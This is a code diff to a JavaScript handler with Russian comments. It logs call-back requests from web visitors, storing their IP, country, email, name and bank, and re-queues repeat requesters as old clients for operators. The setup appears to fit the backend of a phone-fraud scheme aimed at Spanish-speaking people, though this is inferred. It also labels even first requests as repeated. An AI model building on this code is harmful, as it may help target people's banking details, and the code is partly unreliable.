@@ -395,20 +395,42 @@ async function handleCallRequest(req, reply) {
     const ip = getClientIp(req);
     const country = getGeoFromHeaders(req)?.country || '';
 
+    // Если клиент уже был прозвонен — это повторный запрос → переводим в старые клиенты
+    let wasAlreadyCalled = false;
+    if (flowSessionId) {
+      try {
+        const existing = await prisma.webClient.findUnique({
+          where: { flowSessionId },
+          select: { operatorCalled: true, operatorStatus: true },
+        });
+        wasAlreadyCalled = !!(existing?.operatorCalled ||
+          (existing?.operatorStatus && existing.operatorStatus !== 'pending'));
+      } catch { /* колонки могут ещё не существовать */ }
+    }
+
     const patch = {
       callRequested: true,
-      status: 'ЗАПРОСИЛ ЗВОНОК',
+      status: 'ЗАПРОСИЛ ЗВОНОК (ПОВТОРНО)',
     };
     if (email) patch.email = email;
     if (bank) patch.bank = bank;
     if (nombre) patch.nombre = nombre;
     if (ip) patch.ip = ip;
 
+    if (wasAlreadyCalled) {
+      // Повторный звонок → старый клиент, сброс статуса оператора
+      patch.clientType = 'olduser';
+      patch.operatorStatus = 'pending';
+      patch.operatorCalled = false;
+      patch.calledAt = null;
+      patch.status = 'ПОВТОРНЫЙ ЗАПРОС ЗВОНКА';
+    }
+
     const client = flowSessionId ? await upsertWebClient(flowSessionId, patch) : null;
-    await createWebEvent(flowSessionId, client?.id, 'tourist_call_requested', { bank: bank || null, email: email || null, ip: ip || null });
+    await createWebEvent(flowSessionId, client?.id, 'tourist_call_requested', { bank: bank || null, email: email || null, ip: ip || null, repeated: wasAlreadyCalled });
 
     const lines = [
-      '*📞 ЗАПРОСИЛ ЗВОНОК*',
+      wasAlreadyCalled ? '*🔄 ПОВТОРНЫЙ ЗАПРОС ЗВОНКА (→ Старые клиенты)*' : '*📞 ЗАПРОСИЛ ЗВОНОК*',
       flowSessionId ? `Session: \`${flowSessionId}\`` : '',
       nombre ? `Имя: *${nombre}*` : '',
       bank ? `Банк: *${bank}*` : '',
